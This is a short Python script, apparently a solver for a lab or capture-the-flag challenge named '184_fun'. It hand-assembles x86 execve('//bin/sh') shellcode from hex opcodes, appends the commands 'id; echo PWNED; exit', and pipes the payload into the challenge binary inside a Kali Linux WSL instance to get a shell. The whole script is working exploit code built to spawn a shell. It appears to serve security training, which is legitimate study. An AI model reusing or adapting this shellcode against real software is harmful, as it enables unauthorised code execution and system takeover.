import sys, subprocess
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
CWD = r"/tmp/cylab_eps"
ins = ["89e7"]
for ch in "//bin/sh":
    ins.append("b0%02x" % ord(ch))
    ins.append("aa90")
ins += ["31c0", "aa90", "89e3", "5090", "5390", "89e1", "b00b", "cd80"]
sc = b"".join(bytes.fromhex(i) for i in ins)
open(CWD + r"\in184b.bin", "wb").write(sc + b"\nid; echo PWNED; exit\n")
out = subprocess.run(["wsl", "-d", "kali-linux", "--", "bash", "-c",
                      "cd /tmp/cylab_eps && "
                      "chmod +x 184_fun && (./184_fun < in184b.bin 2>&1 | head -10)"],
                     capture_output=True, text=True).stdout
print("=== sortie locale ===")
print(out[:800])
